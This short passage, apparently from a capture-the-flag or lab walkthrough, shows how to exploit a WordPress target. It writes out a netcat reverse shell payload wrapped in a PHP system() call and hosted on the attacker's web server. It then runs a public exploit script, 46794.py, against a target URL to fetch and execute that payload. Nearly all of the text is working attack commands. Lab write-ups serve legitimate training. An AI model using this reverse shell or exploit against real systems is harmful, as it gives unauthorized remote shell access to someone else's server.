As per the GitHub description we need to create a text file that will be hosted on our attacking machine with the contents of what we want to execute.
```html
<pre>system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.139.254 6666 >/tmp/f')</pre>
```

First I hosted a Python SimpleHTTPServer on my attacking machine.
```sh
simplehttp
```
```sh
python2 46794.py  --target http://192.168.178.123/wordpress/ --payload-uri http://192.168.49.178/test.txt
```
